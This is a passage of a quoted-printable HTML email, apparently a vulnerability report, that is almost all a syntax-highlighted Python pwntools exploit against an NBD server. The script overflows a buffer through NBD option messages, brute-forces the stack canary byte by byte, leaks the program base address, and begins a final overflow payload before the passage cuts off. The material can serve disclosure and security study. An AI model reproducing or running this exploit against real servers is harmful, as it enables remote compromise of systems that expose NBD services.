option</span> <span style=3D"color:rgb(86,182,194)">+=3D</span> <span style=
=3D"color:rgb(229,192,123)">NBD_NEW_VERSION</span></div><div>=C2=A0 =C2=A0 =
<span style=3D"color:rgb(224,108,117)">option</span> <span style=3D"color:r=
gb(86,182,194)">+=3D</span> <span style=3D"color:rgb(97,175,239)">p32</span=
>(<span style=3D"color:rgb(229,192,123)">NBD_OPT</span>[<span style=3D"colo=
r:rgb(152,195,121)">&quot;NBD_OPT_LIST_META_CONTEXT&quot;</span>])</div><di=
v>=C2=A0 =C2=A0 <span style=3D"color:rgb(224,108,117)">option</span> <span =
style=3D"color:rgb(86,182,194)">+=3D</span> <span style=3D"color:rgb(97,175=
,239)">p32</span>(<span style=3D"color:rgb(209,154,102)">4</span> <span sty=
le=3D"color:rgb(86,182,194)">+</span> <span style=3D"color:rgb(97,175,239)"=
>len</span>(<span style=3D"color:rgb(224,108,117);font-style:italic">export=
name</span>) <span style=3D"color:rgb(86,182,194)">+</span> <span style=3D"=
color:rgb(209,154,102)">4</span> <span style=3D"color:rgb(86,182,194)">+</s=
pan> <span style=3D"color:rgb(209,154,102)">4</span> <span style=3D"color:r=
gb(86,182,194)">+</span> <span style=3D"color:rgb(97,175,239)">len</span>(<=
span style=3D"color:rgb(224,108,117);font-style:italic">querystring</span>)=
)</div><div>=C2=A0 =C2=A0 <span style=3D"color:rgb(224,108,117)">p</span>.<=
span style=3D"color:rgb(97,175,239)">send</span>(<span style=3D"color:rgb(2=
24,108,117)">option</span>)</div><div>=C2=A0 =C2=A0 </div><div>=C2=A0 =C2=
=A0 <span style=3D"color:rgb(224,108,117)">msg</span> <span style=3D"color:=
rgb(86,182,194)">=3D</span> <span style=3D"color:rgb(198,120,221)">b</span>=
<span style=3D"color:rgb(152,195,121)">&quot;&quot;</span></div><div>=C2=A0=
 =C2=A0 <span style=3D"color:rgb(224,108,117)">msg</span> <span style=3D"co=
lor:rgb(86,182,194)">+=3D</span> <span style=3D"color:rgb(97,175,239)">p32<=
/span>(<span style=3D"color:rgb(97,175,239)">len</span>(<span style=3D"colo=
r:rgb(224,108,117);font-style:italic">exportname</span>)) <span style=3D"co=
lor:rgb(127,132,142);font-style:italic"># exportnamelen</span></div><div>=
=C2=A0 =C2=A0 <span style=3D"color:rgb(224,108,117)">msg</span> <span style=
=3D"color:rgb(86,182,194)">+=3D</span> <span style=3D"color:rgb(224,108,117=
);font-style:italic">exportname</span>.<span style=3D"color:rgb(97,175,239)=
">encode</span>(<span style=3D"color:rgb(152,195,121)">&quot;latin&quot;</s=
pan>) <span style=3D"color:rgb(127,132,142);font-style:italic"># exportname=
</span></div><div>=C2=A0 =C2=A0 <span style=3D"color:rgb(224,108,117)">msg<=
/span> <span style=3D"color:rgb(86,182,194)">+=3D</span> <span style=3D"col=
or:rgb(97,175,239)">p32</span>(<span style=3D"color:rgb(209,154,102)">1</sp=
an>) <span style=3D"color:rgb(127,132,142);font-style:italic"># nr_queries<=
/span></div><div>=C2=A0 =C2=A0 <span style=3D"color:rgb(224,108,117)">msg</=
span> <span style=3D"color:rgb(86,182,194)">+=3D</span> <span style=3D"colo=
r:rgb(97,175,239)">p32</span>(<span style=3D"color:rgb(97,175,239)">len</sp=
an>(<span style=3D"color:rgb(224,108,117);font-style:italic">querystring</s=
pan>)) <span style=3D"color:rgb(127,132,142);font-style:italic"># querylen<=
/span></div><div>=C2=A0 =C2=A0 <span style=3D"color:rgb(224,108,117)">msg</=
span> <span style=3D"color:rgb(86,182,194)">+=3D</span> <span style=3D"colo=
r:rgb(224,108,117);font-style:italic">querystring</span>.<span style=3D"col=
or:rgb(97,175,239)">encode</span>(<span style=3D"color:rgb(152,195,121)">&q=
uot;latin&quot;</span>) <span style=3D"color:rgb(127,132,142);font-style:it=
alic"># querystring</span></div><div>=C2=A0 =C2=A0 <span style=3D"color:rgb=
(224,108,117)">p</span>.<span style=3D"color:rgb(97,175,239)">send</span>(<=
span style=3D"color:rgb(224,108,117)">msg</span>)</div><br><div>=C2=A0 =C2=
=A0 <span style=3D"color:rgb(198,120,221);font-style:italic">return</span><=
/div><br><div><span style=3D"color:rgb(198,120,221)">def</span> <span style=
=3D"color:rgb(97,175,239)">nbd_opt_go</span>(<span style=3D"color:rgb(224,1=
08,117);font-style:italic">exportname</span>, <span style=3D"color:rgb(224,=
108,117);font-style:italic">info</span>):</div><div>=C2=A0 =C2=A0 <span sty=
le=3D"color:rgb(224,108,117)">option</span> <span style=3D"color:rgb(86,182=
,194)">=3D</span> <span style=3D"color:rgb(198,120,221)">b</span><span styl=
e=3D"color:rgb(152,195,121)">&quot;&quot;</span></div><div>=C2=A0 =C2=A0 <s=
pan style=3D"color:rgb(224,108,117)">option</span> <span style=3D"color:rgb=
(86,182,194)">+=3D</span> <span style=3D"color:rgb(229,192,123)">NBD_NEW_VE=
RSION</span></div><div>=C2=A0 =C2=A0 <span style=3D"color:rgb(224,108,117)"=
>option</span> <span style=3D"color:rgb(86,182,194)">+=3D</span> <span styl=
e=3D"color:rgb(97,175,239)">p32</span>(<span style=3D"color:rgb(229,192,123=
)">NBD_OPT</span>[<span style=3D"color:rgb(152,195,121)">&quot;NBD_OPT_GO&q=
uot;</span>])</div><div>=C2=A0 =C2=A0 <span style=3D"color:rgb(224,108,117)=
">option</span> <span style=3D"color:rgb(86,182,194)">+=3D</span> <span sty=
le=3D"color:rgb(97,175,239)">p32</span>(<span style=3D"color:rgb(209,154,10=
2)">4</span> <span style=3D"color:rgb(86,182,194)">+</span> <span style=3D"=
color:rgb(97,175,239)">len</span>(<span style=3D"color:rgb(224,108,117);fon=
t-style:italic">exportname</span>) <span style=3D"color:rgb(86,182,194)">+<=
/span> <span style=3D"color:rgb(209,154,102)">2</span> <span style=3D"color=
:rgb(86,182,194)">+</span> <span style=3D"color:rgb(209,154,102)">2</span>)=
</div><div>=C2=A0 =C2=A0 <span style=3D"color:rgb(224,108,117)">p</span>.<s=
pan style=3D"color:rgb(97,175,239)">send</span>(<span style=3D"color:rgb(22=
4,108,117)">option</span>)</div><div>=C2=A0 =C2=A0 </div><div>=C2=A0 =C2=A0=
 <span style=3D"color:rgb(224,108,117)">msg</span> <span style=3D"color:rgb=
(86,182,194)">=3D</span> <span style=3D"color:rgb(198,120,221)">b</span><sp=
an style=3D"color:rgb(152,195,121)">&quot;&quot;</span></div><div>=C2=A0 =
=C2=A0 <span style=3D"color:rgb(224,108,117)">msg</span> <span style=3D"col=
or:rgb(86,182,194)">+=3D</span> <span style=3D"color:rgb(97,175,239)">p32</=
span>(<span style=3D"color:rgb(97,175,239)">len</span>(<span style=3D"color=
:rgb(224,108,117);font-style:italic">exportname</span>)) <span style=3D"col=
or:rgb(127,132,142);font-style:italic"># exportnamelen</span></div><div>=C2=
=A0 =C2=A0 <span style=3D"color:rgb(224,108,117)">msg</span> <span style=3D=
"color:rgb(86,182,194)">+=3D</span> <span style=3D"color:rgb(224,108,117);f=
ont-style:italic">exportname</span>.<span style=3D"color:rgb(97,175,239)">e=
ncode</span>(<span style=3D"color:rgb(152,195,121)">&quot;latin&quot;</span=
>) <span style=3D"color:rgb(127,132,142);font-style:italic"># exportname</s=
pan></div><div>=C2=A0 =C2=A0 <span style=3D"color:rgb(224,108,117)">msg</sp=
an> <span style=3D"color:rgb(86,182,194)">+=3D</span> <span style=3D"color:=
rgb(97,175,239)">p16</span>(<span style=3D"color:rgb(209,154,102)">1</span>=
) <span style=3D"color:rgb(127,132,142);font-style:italic"># nrinfos</span>=
</div><div>=C2=A0 =C2=A0 <span style=3D"color:rgb(224,108,117)">msg</span> =
<span style=3D"color:rgb(86,182,194)">+=3D</span> <span style=3D"color:rgb(=
97,175,239)">p16</span>(<span style=3D"color:rgb(224,108,117);font-style:it=
alic">info</span>) <span style=3D"color:rgb(127,132,142);font-style:italic"=
># info</span></div><div>=C2=A0 =C2=A0 <span style=3D"color:rgb(224,108,117=
)">p</span>.<span style=3D"color:rgb(97,175,239)">send</span>(<span style=
=3D"color:rgb(224,108,117)">msg</span>)</div><br><div>=C2=A0 =C2=A0 <span s=
tyle=3D"color:rgb(198,120,221);font-style:italic">return</span></div><br><d=
iv><span style=3D"color:rgb(224,108,117)">t0</span> <span style=3D"color:rg=
b(86,182,194)">=3D</span> <span style=3D"color:rgb(229,192,123)">time</span=
>.<span style=3D"color:rgb(97,175,239)">perf_counter</span>()</div><br><div=
><span style=3D"color:rgb(198,120,221);font-style:italic">if</span> <span s=
tyle=3D"color:rgb(97,175,239)">len</span>(<span style=3D"color:rgb(229,192,=
123)">sys</span>.<span style=3D"color:rgb(224,108,117)">argv</span>) <span =
style=3D"color:rgb(86,182,194)">&lt;</span> <span style=3D"color:rgb(209,15=
4,102)">3</span>:</div><div>=C2=A0 =C2=A0 <span style=3D"color:rgb(97,175,2=
39)">print</span>(<span style=3D"color:rgb(152,195,121)">&quot;usage: nbdte=
st.py ip port&quot;</span>)</div><div>=C2=A0 =C2=A0 <span style=3D"color:rg=
b(97,175,239)">exit</span>(<span style=3D"color:rgb(209,154,102)">0</span>)=
</div><br><div><span style=3D"color:rgb(224,108,117)">ip</span> <span style=
=3D"color:rgb(86,182,194)">=3D</span> <span style=3D"color:rgb(229,192,123)=
">sys</span>.<span style=3D"color:rgb(224,108,117)">argv</span>[<span style=
=3D"color:rgb(209,154,102)">1</span>]</div><div><span style=3D"color:rgb(22=
4,108,117)">port</span> <span style=3D"color:rgb(86,182,194)">=3D</span> <s=
pan style=3D"color:rgb(229,192,123)">int</span>(<span style=3D"color:rgb(22=
9,192,123)">sys</span>.<span style=3D"color:rgb(224,108,117)">argv</span>[<=
span style=3D"color:rgb(209,154,102)">2</span>])</div><div><span style=3D"c=
olor:rgb(224,108,117)">p</span> <span style=3D"color:rgb(86,182,194)">=3D</=
span> <span style=3D"color:rgb(97,175,239)">remote</span>(<span style=3D"co=
lor:rgb(224,108,117)">ip</span>, <span style=3D"color:rgb(224,108,117)">por=
t</span>)</div><br><div><span style=3D"color:rgb(224,108,117)">p</span>.<sp=
an style=3D"color:rgb(97,175,239)">recvuntil</span>(<span style=3D"color:rg=
b(198,120,221)">b</span><span style=3D"color:rgb(152,195,121)">&quot;NBDMAG=
ICIHAVEOPT&quot;</span>)</div><div><span style=3D"color:rgb(224,108,117)">g=
flag</span> <span style=3D"color:rgb(86,182,194)">=3D</span> <span style=3D=
"color:rgb(97,175,239)">u16</span>(<span style=3D"color:rgb(224,108,117)">p=
</span>.<span style=3D"color:rgb(97,175,239)">recv</span>())</div><div><spa=
n style=3D"color:rgb(224,108,117)">p</span>.<span style=3D"color:rgb(97,175=
,239)">send</span>(<span style=3D"color:rgb(97,175,239)">p32</span>(<span s=
tyle=3D"color:rgb(224,108,117)">gflag</span>))</div><br><div><span style=3D=
"color:rgb(224,108,117)">canary</span> <span style=3D"color:rgb(86,182,194)=
">=3D</span> <span style=3D"color:rgb(198,120,221)">b</span><span style=3D"=
color:rgb(152,195,121)">&quot;</span><span style=3D"color:rgb(86,182,194)">=
\x00</span><span style=3D"color:rgb(152,195,121)">&quot;</span></div><div><=
span style=3D"color:rgb(198,120,221);font-style:italic">for</span> <span st=
yle=3D"color:rgb(224,108,117)">i</span> <span style=3D"color:rgb(198,120,22=
1);font-style:italic">in</span> <span style=3D"color:rgb(229,192,123)">rang=
e</span>(<span style=3D"color:rgb(209,154,102)">7</span>):</div><div>=C2=A0=
 =C2=A0 <span style=3D"color:rgb(198,120,221);font-style:italic">for</span>=
 <span style=3D"color:rgb(224,108,117)">j</span> <span style=3D"color:rgb(1=
98,120,221);font-style:italic">in</span> <span style=3D"color:rgb(229,192,1=
23)">range</span>(<span style=3D"color:rgb(209,154,102)">256</span>):</div>=
<div>=C2=A0 =C2=A0 =C2=A0 =C2=A0 <span style=3D"color:rgb(224,108,117)">pay=
load</span> <span style=3D"color:rgb(86,182,194)">=3D</span> <span style=3D=
"color:rgb(198,120,221)">b</span><span style=3D"color:rgb(152,195,121)">&qu=
ot;&quot;</span></div><div>=C2=A0 =C2=A0 =C2=A0 =C2=A0 <span style=3D"color=
:rgb(224,108,117)">payload</span> <span style=3D"color:rgb(86,182,194)">+=
=3D</span> <span style=3D"color:rgb(198,120,221)">b</span><span style=3D"co=
lor:rgb(152,195,121)">&quot;A&quot;</span><span style=3D"color:rgb(86,182,1=
94)">*</span><span style=3D"color:rgb(209,154,102)">1032</span></div><div>=
=C2=A0 =C2=A0 =C2=A0 =C2=A0 <span style=3D"color:rgb(224,108,117)">payload<=
/span> <span style=3D"color:rgb(86,182,194)">+=3D</span> <span style=3D"col=
or:rgb(224,108,117)">canary</span></div><div>=C2=A0 =C2=A0 =C2=A0 =C2=A0 <s=
pan style=3D"color:rgb(224,108,117)">payload</span> <span style=3D"color:rg=
b(86,182,194)">+=3D</span> <span style=3D"color:rgb(97,175,239)">p8</span>(=
<span style=3D"color:rgb(224,108,117)">j</span>)</div><div>=C2=A0 =C2=A0 =
=C2=A0 =C2=A0 <span style=3D"color:rgb(97,175,239)">nbd_opt_info</span>(<sp=
an style=3D"color:rgb(224,108,117)">payload</span>, <span style=3D"color:rg=
b(198,120,221)">b</span><span style=3D"color:rgb(152,195,121)">&quot;B&quot=
;</span><span style=3D"color:rgb(86,182,194)">*</span><span style=3D"color:=
rgb(209,154,102)">4096</span>)</div><div>=C2=A0 =C2=A0 =C2=A0 =C2=A0 <span =
style=3D"color:rgb(224,108,117)">p</span>.<span style=3D"color:rgb(97,175,2=
39)">recvuntil</span>(<span style=3D"color:rgb(198,120,221)">b</span><span =
style=3D"color:rgb(152,195,121)">&quot;Export unknown&quot;</span>)</div><b=
r><div>=C2=A0 =C2=A0 =C2=A0 =C2=A0 <span style=3D"color:rgb(224,108,117)">p=
</span>.<span style=3D"color:rgb(97,175,239)">send</span>(<span style=3D"co=
lor:rgb(229,192,123)">NBD_NEW_VERSION</span> <span style=3D"color:rgb(86,18=
2,194)">+</span> <span style=3D"color:rgb(97,175,239)">p32</span>(<span sty=
le=3D"color:rgb(198,120,221)">0x</span><span style=3D"color:rgb(209,154,102=
)">deadbeef</span>) <span style=3D"color:rgb(86,182,194)">+</span> <span st=
yle=3D"color:rgb(97,175,239)">p32</span>(<span style=3D"color:rgb(209,154,1=
02)">0</span>))</div><div>=C2=A0 =C2=A0 =C2=A0 =C2=A0 <span style=3D"color:=
rgb(198,120,221);font-style:italic">try</span>:</div><div>=C2=A0 =C2=A0 =C2=
=A0 =C2=A0 =C2=A0 =C2=A0 <span style=3D"color:rgb(224,108,117)">p</span>.<s=
pan style=3D"color:rgb(97,175,239)">recvuntil</span>(<span style=3D"color:r=
gb(198,120,221)">b</span><span style=3D"color:rgb(152,195,121)">&quot;The g=
iven option is unknown to this server implementation&quot;</span>)</div><di=
v>=C2=A0 =C2=A0 =C2=A0 =C2=A0 <span style=3D"color:rgb(198,120,221);font-st=
yle:italic">except</span>:</div><div>=C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=
=A0 <span style=3D"color:rgb(224,108,117)">p</span>.<span style=3D"color:rg=
b(97,175,239)">close</span>()</div><br><div>=C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=
=A0 =C2=A0 <span style=3D"color:rgb(224,108,117)">p</span> <span style=3D"c=
olor:rgb(86,182,194)">=3D</span> <span style=3D"color:rgb(97,175,239)">remo=
te</span>(<span style=3D"color:rgb(224,108,117)">ip</span>, <span style=3D"=
color:rgb(224,108,117)">port</span>)</div><div>=C2=A0 =C2=A0 =C2=A0 =C2=A0 =
=C2=A0 =C2=A0 <span style=3D"color:rgb(224,108,117)">p</span>.<span style=
=3D"color:rgb(97,175,239)">recvuntil</span>(<span style=3D"color:rgb(198,12=
0,221)">b</span><span style=3D"color:rgb(152,195,121)">&quot;NBDMAGICIHAVEO=
PT&quot;</span>)</div><div>=C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 <span =
style=3D"color:rgb(224,108,117)">gflag</span> <span style=3D"color:rgb(86,1=
82,194)">=3D</span> <span style=3D"color:rgb(97,175,239)">u16</span>(<span =
style=3D"color:rgb(224,108,117)">p</span>.<span style=3D"color:rgb(97,175,2=
39)">recv</span>())</div><div>=C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 <sp=
an style=3D"color:rgb(224,108,117)">p</span>.<span style=3D"color:rgb(97,17=
5,239)">send</span>(<span style=3D"color:rgb(97,175,239)">p32</span>(<span =
style=3D"color:rgb(224,108,117)">gflag</span>))</div><div>=C2=A0 =C2=A0 =C2=
=A0 =C2=A0 =C2=A0 =C2=A0 <span style=3D"color:rgb(198,120,221);font-style:i=
talic">continue</span></div><br><div>=C2=A0 =C2=A0 =C2=A0 =C2=A0 <span styl=
e=3D"color:rgb(224,108,117)">canary</span> <span style=3D"color:rgb(86,182,=
194)">+=3D</span> <span style=3D"color:rgb(97,175,239)">p8</span>(<span sty=
le=3D"color:rgb(224,108,117)">j</span>)</div><div>=C2=A0 =C2=A0 =C2=A0 =C2=
=A0 <span style=3D"color:rgb(224,108,117)">p</span>.<span style=3D"color:rg=
b(97,175,239)">close</span>()</div><br><div>=C2=A0 =C2=A0 =C2=A0 =C2=A0 <sp=
an style=3D"color:rgb(224,108,117)">p</span> <span style=3D"color:rgb(86,18=
2,194)">=3D</span> <span style=3D"color:rgb(97,175,239)">remote</span>(<spa=
n style=3D"color:rgb(224,108,117)">ip</span>, <span style=3D"color:rgb(224,=
108,117)">port</span>)</div><div>=C2=A0 =C2=A0 =C2=A0 =C2=A0 <span style=3D=
"color:rgb(224,108,117)">p</span>.<span style=3D"color:rgb(97,175,239)">rec=
vuntil</span>(<span style=3D"color:rgb(198,120,221)">b</span><span style=3D=
"color:rgb(152,195,121)">&quot;NBDMAGICIHAVEOPT&quot;</span>)</div><div>=C2=
=A0 =C2=A0 =C2=A0 =C2=A0 <span style=3D"color:rgb(224,108,117)">gflag</span=
> <span style=3D"color:rgb(86,182,194)">=3D</span> <span style=3D"color:rgb=
(97,175,239)">u16</span>(<span style=3D"color:rgb(224,108,117)">p</span>.<s=
pan style=3D"color:rgb(97,175,239)">recv</span>())</div><div>=C2=A0 =C2=A0 =
=C2=A0 =C2=A0 <span style=3D"color:rgb(224,108,117)">p</span>.<span style=
=3D"color:rgb(97,175,239)">send</span>(<span style=3D"color:rgb(97,175,239)=
">p32</span>(<span style=3D"color:rgb(224,108,117)">gflag</span>))</div><di=
v>=C2=A0 =C2=A0 =C2=A0 =C2=A0 <span style=3D"color:rgb(198,120,221);font-st=
yle:italic">break</span></div><br><div>log.<span style=3D"color:rgb(97,175,=
239)">success</span>(<span style=3D"color:rgb(152,195,121)">&quot;canary: &=
quot;</span><span style=3D"color:rgb(86,182,194)">+</span> <span style=3D"c=
olor:rgb(97,175,239)">hex</span>(<span style=3D"color:rgb(97,175,239)">u64<=
/span>(<span style=3D"color:rgb(224,108,117)">canary</span>.<span style=3D"=
color:rgb(97,175,239)">ljust</span>(<span style=3D"color:rgb(209,154,102)">=
8</span>, <span style=3D"color:rgb(198,120,221)">b</span><span style=3D"col=
or:rgb(152,195,121)">&quot;</span><span style=3D"color:rgb(86,182,194)">\x0=
0</span><span style=3D"color:rgb(152,195,121)">&quot;</span>), <span style=
=3D"color:rgb(224,108,117);font-style:italic">endian</span><span style=3D"c=
olor:rgb(86,182,194)">=3D</span><span style=3D"color:rgb(152,195,121)">&#39=
;little&#39;</span>)))</div><br><div><span style=3D"color:rgb(224,108,117)"=
>progaddr</span> <span style=3D"color:rgb(86,182,194)">=3D</span> <span sty=
le=3D"color:rgb(198,120,221)">b</span><span style=3D"color:rgb(152,195,121)=
">&quot;</span><span style=3D"color:rgb(86,182,194)">\x70</span><span style=
=3D"color:rgb(152,195,121)">&quot;</span></div><div><span style=3D"color:rg=
b(198,120,221);font-style:italic">for</span> <span style=3D"color:rgb(224,1=
08,117)">i</span> <span style=3D"color:rgb(198,120,221);font-style:italic">=
in</span> <span style=3D"color:rgb(229,192,123)">range</span>(<span style=
=3D"color:rgb(209,154,102)">5</span>):</div><div>=C2=A0 =C2=A0 <span style=
=3D"color:rgb(198,120,221);font-style:italic">for</span> <span style=3D"col=
or:rgb(224,108,117)">j</span> <span style=3D"color:rgb(198,120,221);font-st=
yle:italic">in</span> <span style=3D"color:rgb(229,192,123)">range</span>(<=
span style=3D"color:rgb(209,154,102)">256</span>):</div><div>=C2=A0 =C2=A0 =
=C2=A0 =C2=A0 <span style=3D"color:rgb(224,108,117)">payload</span> <span s=
tyle=3D"color:rgb(86,182,194)">=3D</span> <span style=3D"color:rgb(198,120,=
221)">b</span><span style=3D"color:rgb(152,195,121)">&quot;&quot;</span></d=
iv><div>=C2=A0 =C2=A0 =C2=A0 =C2=A0 <span style=3D"color:rgb(224,108,117)">=
payload</span> <span style=3D"color:rgb(86,182,194)">+=3D</span> <span styl=
e=3D"color:rgb(198,120,221)">b</span><span style=3D"color:rgb(152,195,121)"=
>&quot;A&quot;</span><span style=3D"color:rgb(86,182,194)">*</span><span st=
yle=3D"color:rgb(209,154,102)">1032</span></div><div>=C2=A0 =C2=A0 =C2=A0 =
=C2=A0 <span style=3D"color:rgb(224,108,117)">payload</span> <span style=3D=
"color:rgb(86,182,194)">+=3D</span> <span style=3D"color:rgb(224,108,117)">=
canary</span></div><div>=C2=A0 =C2=A0 =C2=A0 =C2=A0 <span style=3D"color:rg=
b(224,108,117)">payload</span> <span style=3D"color:rgb(86,182,194)">+=3D</=
span> <span style=3D"color:rgb(97,175,239)">p64</span>(<span style=3D"color=
:rgb(198,120,221)">0x</span><span style=3D"color:rgb(209,154,102)">deadbeef=
</span>, <span style=3D"color:rgb(224,108,117);font-style:italic">endian</s=
pan><span style=3D"color:rgb(86,182,194)">=3D</span><span style=3D"color:rg=
b(152,195,121)">&#39;little&#39;</span>)<span style=3D"color:rgb(86,182,194=
)">*</span><span style=3D"color:rgb(209,154,102)">7</span></div><div>=C2=A0=
 =C2=A0 =C2=A0 =C2=A0 <span style=3D"color:rgb(224,108,117)">payload</span>=
 <span style=3D"color:rgb(86,182,194)">+=3D</span> <span style=3D"color:rgb=
(224,108,117)">progaddr</span></div><div>=C2=A0 =C2=A0 =C2=A0 =C2=A0 <span =
style=3D"color:rgb(224,108,117)">payload</span> <span style=3D"color:rgb(86=
,182,194)">+=3D</span> <span style=3D"color:rgb(97,175,239)">p8</span>(<spa=
n style=3D"color:rgb(224,108,117)">j</span>)</div><div>=C2=A0 =C2=A0 =C2=A0=
 =C2=A0 <span style=3D"color:rgb(97,175,239)">nbd_opt_info</span>(<span sty=
le=3D"color:rgb(224,108,117)">payload</span>, <span style=3D"color:rgb(198,=
120,221)">b</span><span style=3D"color:rgb(152,195,121)">&quot;B&quot;</spa=
n><span style=3D"color:rgb(86,182,194)">*</span><span style=3D"color:rgb(20=
9,154,102)">4096</span>)</div><div>=C2=A0 =C2=A0 =C2=A0 =C2=A0 <span style=
=3D"color:rgb(224,108,117)">p</span>.<span style=3D"color:rgb(97,175,239)">=
recvuntil</span>(<span style=3D"color:rgb(198,120,221)">b</span><span style=
=3D"color:rgb(152,195,121)">&quot;Export unknown&quot;</span>)</div><br><di=
v>=C2=A0 =C2=A0 =C2=A0 =C2=A0 <span style=3D"color:rgb(198,120,221);font-st=
yle:italic">try</span>:</div><div>=C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0=
 <span style=3D"color:rgb(224,108,117)">p</span>.<span style=3D"color:rgb(9=
7,175,239)">recvuntil</span>(<span style=3D"color:rgb(198,120,221)">b</span=
><span style=3D"color:rgb(152,195,121)">&quot;NBDMAGICIHAVEOPT&quot;</span>=
)</div><div>=C2=A0 =C2=A0 =C2=A0 =C2=A0 <span style=3D"color:rgb(198,120,22=
1);font-style:italic">except</span>:</div><div>=C2=A0 =C2=A0 =C2=A0 =C2=A0 =
=C2=A0 =C2=A0 <span style=3D"color:rgb(224,108,117)">p</span>.<span style=
=3D"color:rgb(97,175,239)">close</span>()</div><br><div>=C2=A0 =C2=A0 =C2=
=A0 =C2=A0 =C2=A0 =C2=A0 <span style=3D"color:rgb(224,108,117)">p</span> <s=
pan style=3D"color:rgb(86,182,194)">=3D</span> <span style=3D"color:rgb(97,=
175,239)">remote</span>(<span style=3D"color:rgb(224,108,117)">ip</span>, <=
span style=3D"color:rgb(224,108,117)">port</span>)</div><div>=C2=A0 =C2=A0 =
=C2=A0 =C2=A0 =C2=A0 =C2=A0 <span style=3D"color:rgb(224,108,117)">p</span>=
.<span style=3D"color:rgb(97,175,239)">recvuntil</span>(<span style=3D"colo=
r:rgb(198,120,221)">b</span><span style=3D"color:rgb(152,195,121)">&quot;NB=
DMAGICIHAVEOPT&quot;</span>)</div><div>=C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =
=C2=A0 <span style=3D"color:rgb(224,108,117)">gflag</span> <span style=3D"c=
olor:rgb(86,182,194)">=3D</span> <span style=3D"color:rgb(97,175,239)">u16<=
/span>(<span style=3D"color:rgb(224,108,117)">p</span>.<span style=3D"color=
:rgb(97,175,239)">recv</span>())</div><div>=C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=
=A0 =C2=A0 <span style=3D"color:rgb(224,108,117)">p</span>.<span style=3D"c=
olor:rgb(97,175,239)">send</span>(<span style=3D"color:rgb(97,175,239)">p32=
</span>(<span style=3D"color:rgb(224,108,117)">gflag</span>))</div><div>=C2=
=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 <span style=3D"color:rgb(198,120,221=
);font-style:italic">continue</span></div><br><div>=C2=A0 =C2=A0 =C2=A0 =C2=
=A0 <span style=3D"color:rgb(224,108,117)">progaddr</span> <span style=3D"c=
olor:rgb(86,182,194)">+=3D</span> <span style=3D"color:rgb(97,175,239)">p8<=
/span>(<span style=3D"color:rgb(224,108,117)">j</span>)</div><div>=C2=A0 =
=C2=A0 =C2=A0 =C2=A0 <span style=3D"color:rgb(224,108,117)">p</span>.<span =
style=3D"color:rgb(97,175,239)">close</span>()</div><br><div>=C2=A0 =C2=A0 =
=C2=A0 =C2=A0 <span style=3D"color:rgb(224,108,117)">p</span> <span style=
=3D"color:rgb(86,182,194)">=3D</span> <span style=3D"color:rgb(97,175,239)"=
>remote</span>(<span style=3D"color:rgb(224,108,117)">ip</span>, <span styl=
e=3D"color:rgb(224,108,117)">port</span>)</div><div>=C2=A0 =C2=A0 =C2=A0 =
=C2=A0 <span style=3D"color:rgb(224,108,117)">p</span>.<span style=3D"color=
:rgb(97,175,239)">recvuntil</span>(<span style=3D"color:rgb(198,120,221)">b=
</span><span style=3D"color:rgb(152,195,121)">&quot;NBDMAGICIHAVEOPT&quot;<=
/span>)</div><div>=C2=A0 =C2=A0 =C2=A0 =C2=A0 <span style=3D"color:rgb(224,=
108,117)">gflag</span> <span style=3D"color:rgb(86,182,194)">=3D</span> <sp=
an style=3D"color:rgb(97,175,239)">u16</span>(<span style=3D"color:rgb(224,=
108,117)">p</span>.<span style=3D"color:rgb(97,175,239)">recv</span>())</di=
v><div>=C2=A0 =C2=A0 =C2=A0 =C2=A0 <span style=3D"color:rgb(224,108,117)">p=
</span>.<span style=3D"color:rgb(97,175,239)">send</span>(<span style=3D"co=
lor:rgb(97,175,239)">p32</span>(<span style=3D"color:rgb(224,108,117)">gfla=
g</span>))</div><div>=C2=A0 =C2=A0 =C2=A0 =C2=A0 <span style=3D"color:rgb(1=
98,120,221);font-style:italic">break</span></div><br><div><span style=3D"co=
lor:rgb(224,108,117)">proc_base</span> <span style=3D"color:rgb(86,182,194)=
">=3D</span> <span style=3D"color:rgb(97,175,239)">u64</span>(<span style=
=3D"color:rgb(224,108,117)">progaddr</span>.<span style=3D"color:rgb(97,175=
,239)">ljust</span>(<span style=3D"color:rgb(209,154,102)">8</span>, <span =
style=3D"color:rgb(198,120,221)">b</span><span style=3D"color:rgb(152,195,1=
21)">&quot;</span><span style=3D"color:rgb(86,182,194)">\x00</span><span st=
yle=3D"color:rgb(152,195,121)">&quot;</span>), <span style=3D"color:rgb(224=
,108,117);font-style:italic">endian</span><span style=3D"color:rgb(86,182,1=
94)">=3D</span><span style=3D"color:rgb(152,195,121)">&#39;little&#39;</spa=
n>) <span style=3D"color:rgb(86,182,194)">-</span> <span style=3D"color:rgb=
(198,120,221)">0x</span><span style=3D"color:rgb(209,154,102)">9570</span><=
/div><div>log.<span style=3D"color:rgb(97,175,239)">success</span>(<span st=
yle=3D"color:rgb(152,195,121)">&quot;proc_base: &quot;</span><span style=3D=
"color:rgb(86,182,194)">+</span> <span style=3D"color:rgb(97,175,239)">hex<=
/span>(<span style=3D"color:rgb(224,108,117)">proc_base</span>))</div><br><=
div><span style=3D"color:rgb(224,108,117)">payload</span> <span style=3D"co=
lor:rgb(86,182,194)">=3D</span> <span style=3D"color:rgb(198,120,221)">b</s=
pan><span style=3D"color:rgb(152,195,121)">&quot;&quot;</span></div><div><s=
pan style=3D"color:rgb(224,108,117)">payload</span> <span style=3D"color:rg=
b(86,182,194)">+=3D</span> <span style=3D"color:rgb(198,120,221)">b</span><=
span style=3D"color:rgb(152,195,121)">&quot;A&quot;</span><span style=3D"co=
lor:rgb(86,182,194)">*</span><span style=3D"color:rgb(209,154,102)">1032</s=
pan></div><div><span style=3D"color:rgb(224,108,117)">payload</span> <span =
style=3D"color:rgb(86,182,194)">+=3D</span> <span style=3D"color:rgb(224,10=
8,117)">canary</span></div><div><span style=3D"color:rgb(224,108,117)">payl=
oad</span> <span style=3D"color:rgb(86,182,194)">+=3D</span> <span style=3D=
"color:rgb(97,175,239)">p64</span>(<span style=3D"color:rgb(198,120,221)">0=
x</span><span style=3D"color:rgb(209,154,102)">deadbeef</span>, <span style=
